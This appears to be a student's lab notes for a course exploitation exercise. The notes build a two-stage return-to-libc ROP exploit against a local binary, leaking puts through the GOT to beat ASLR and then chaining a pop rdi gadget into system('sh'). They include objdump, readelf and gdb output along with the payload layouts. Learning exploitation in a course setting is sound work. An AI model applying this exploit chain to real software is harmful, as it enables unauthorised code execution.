## Find aslr offset: puts GOT vs puts PLT
```
chang-ch@xcne5:~/CS2107/impropercode$ objdump -D ipie -M intel | grep puts
0000000000401080 <puts@plt>:
  401084:       f2 ff 25 8d 2f 00 00    bnd jmp QWORD PTR [rip+0x2f8d]        # 404018 <puts@GLIBC_2.2.5>
  4012f8:       e8 83 fd ff ff          call   401080 <puts@plt>
  401315:       e8 66 fd ff ff          call   401080 <puts@plt>
```
- `puts_plt` = 0x401080 puts calls itself inside GOT, plt is leaked
- `bnd jmp QWORD PTR [rip+0x2f8d] # 404018 <puts@GLIBC_2.2.5>` -> puts leaks actual addr when it calls itself in GOT: `puts_GOT` = 0x404018


## prevent crash, return to main
```
chang-ch@xcne5:~/CS2107/impropercode$ objdump -D ipie -M intel | grep main
  4010f8:       ff 15 f2 2e 00 00       call   QWORD PTR [rip+0x2ef2]        # 403ff0 <__libc_start_main@GLIBC_2.2.5>
00000000004011b6 <main>:
```
- `main_plt` = 0x4011b6, return to main, prevent crash

## Calculate offset SYSTEM from PUTS
```
chang-ch@xcne5:~$ readelf -s /usr/lib/gcc/x86_64-linux-gnu/9/../../../x86_64-linux-gnu/libc.so.6 | grep puts
   195: 0000000000084450   476 FUNC    GLOBAL DEFAULT   15 _IO_puts@@GLIBC_2.2.5
   430: 0000000000084450   476 FUNC    WEAK   DEFAULT   15 puts@@GLIBC_2.2.5
   505: 0000000000124360  1268 FUNC    GLOBAL DEFAULT   15 putspent@@GLIBC_2.2.5
   692: 0000000000126030   728 FUNC    GLOBAL DEFAULT   15 putsgent@@GLIBC_2.10
  1160: 0000000000082d10   384 FUNC    WEAK   DEFAULT   15 fputs@@GLIBC_2.2.5
  1708: 0000000000082d10   384 FUNC    GLOBAL DEFAULT   15 _IO_fputs@@GLIBC_2.2.5
  2345: 000000000008e350   159 FUNC    WEAK   DEFAULT   15 fputs_unlocked@@GLIBC_2.2.5

chang-ch@xcne5:~$ readelf -s /usr/lib/gcc/x86_64-linux-gnu/9/../../../x86_64-linux-gnu/libc.so.6 | grep system
   237: 0000000000153a00   103 FUNC    GLOBAL DEFAULT   15 svcerr_systemerr@@GLIBC_2.2.5
   619: 00000000000522c0    45 FUNC    GLOBAL DEFAULT   15 __libc_system@@GLIBC_PRIVATE
  1430: 00000000000522c0    45 FUNC    WEAK   DEFAULT   15 system@@GLIBC_2.2.5
```
- `puts_libc` = 0x84450
- `system_libc` = 0x522c0
- offset = leaked puts_GOT - `puts_libc`.
- system_addr = offset + 0x522c0

---

### -no-pie -fno-stack-protector -g
```
64 * A + 70*b + 10 * C
rbp (8)
poprdi = 0x4013b3 (8)
sh(variable) = 0x404050 (8)
padret = 0x40101a (8) stack align
system = 0x7ffff7e1d2c0 (8) libc
exitt = 0x7ffff7e11a70 (8) libc
```
- debug ^ with: `break 29; set follow-fork-mode child; set variable IlikeTOnameVARIABLESlikeTHIS = "ls"`

problem:
- `set disable-randomization off`
- libc addr changed.

### Getting libc offset
```
64 * A + 70*b + 10 * C
rbp (8)
poprdi = 0x4013b3 (8)
puts_GOT = 0x404018
puts_plt = 0x401080
main_plt = 0x4011b6 (prevent crash)
END FIRST SEND

RECV puts_offset, calculate offset = leak - 0x84450 puts_libc

SECOND SEND:
64 * A + 70*b + 10 * C
rbp (8)
poprdi = 0x4013b3 (8)
sh(variable) = 0x404050 (8)
padret = 0x40101a (8) stack align
system = leaked puts_GOT - `puts_libc`
```
- `break 29; set disable-randomization off; run < test.bin; break puts`
- [changes] puts_got = `b"Pt\005\371\303\177"`
	- 0x7ffff7e4f450
- offset = got - libc = 0x7ffff7dcb000
- sys_GOT = 0x7ffff7e1d2c0
...
- `set variable IlikeTOnameVARIABLESlikeTHIS = "ls"`,
- `set follow-fork-mode child`,
- `break system`,